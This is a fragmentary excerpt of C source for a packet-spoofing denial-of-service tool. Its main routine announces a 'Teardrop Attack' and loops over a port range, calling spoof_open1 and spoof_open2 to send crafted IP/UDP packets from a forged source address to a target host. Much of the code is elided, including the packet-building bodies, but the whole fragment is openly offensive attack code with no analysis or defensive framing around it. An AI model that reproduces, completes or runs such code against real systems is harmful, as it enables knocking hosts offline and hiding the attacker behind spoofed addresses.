...
unsigned long send_seq, ack_seq, srcport, iden;
char flood = 0;
...
unsigned long spoof_open1(unsigned long my_ip, unsigned long their_ip, unsigned short port) {
	int i, s;
	struct iphdr ih;
	struct udphdr th;
...
unsigned long spoof_open2(unsigned long my_ip, unsigned long their_ip, unsigned short port) {
	int i, s;
	struct iphdr ih;
	struct udphdr th;
	struct sockaddr_in sin;
...
main(int argc, char **argv) {
   int i, x, max, floodloop, diff, j, a, b, c, d;
   ...
   if (diff > -1) 
     {
		printf("[H[J\n\nSend Packet Attack with type Teardrop Attack.\n");
	     j = 0;
	     srandom((time(0)+i));
	     ...
	     for (x=lowport;x<=highport;x++) 
		  ...
		  spoof_open1(/*0xe1e26d0a*/ me_fake, them, x);
		  spoof_open2(me_fake, them, x);
